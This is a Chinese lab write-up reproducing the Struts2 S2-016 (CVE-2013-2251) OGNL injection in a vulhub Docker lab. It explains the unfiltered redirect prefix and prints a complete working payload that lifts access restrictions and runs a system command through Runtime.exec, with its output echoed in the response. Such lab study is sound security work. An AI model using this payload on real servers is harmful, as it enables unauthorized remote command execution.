ailx10说：这篇是2024年5月之前写的，后来又改过。做 S2-016 时，我先从 action、redirect 这些看起来很正常的导航前缀入手，观察后面的内容怎样被当成 OGNL。能执行之后，又试着把输出送回 HTTP 响应，再做连接，把验证的两种方式都记下来。它让我对 Struts2 的问题多了一点具体印象：不是所有请求都会自动执行表达式，而是某个原本负责跳转的入口，把不可信内容带进了求值过程。原笔记里那些很长的载荷，拆开看其实都在解决权限限制、执行和读输出几个小问题。

---

这个实验先做命令执行，然后做反弹shell。Struts2 S2-016漏洞，又名CVE-2013-2251漏洞。在Struts2框架中，DefaultActionMapper类支持以”action:”、”redirect:”、”redirectAction:”作为导航或是重定向前缀，这些导航或者前缀后面可以跟OGNL表达式，但Struts2并没有对这些前缀做过滤，所以可以执行恶意OGNL表达式执行系统命令。[\[1\]](#ref_1)

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build //可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

- `docker-compose down`

简单访问一下，说明Struts2 OGNL表达式注入漏洞（S2-016）环境搭建成功了

OGNL 表达式：

```
redirect:
禁用方法访问限制
${#context["xwork.MethodAccessor.denyMethodExecution"]=false,
允许访问静态方法
#f=#_memberAccess.getClass().getDeclaredField("allowStaticMethodAccess"),#f.setAccessible(true),#f.set(#_memberAccess,true),
执行系统命令
#a=@java.lang.Runtime@getRuntime().exec("uname -a").getInputStream(),
读取命令输出
#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),
将命令输出写入HTTP响应
#genxor=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()}
```
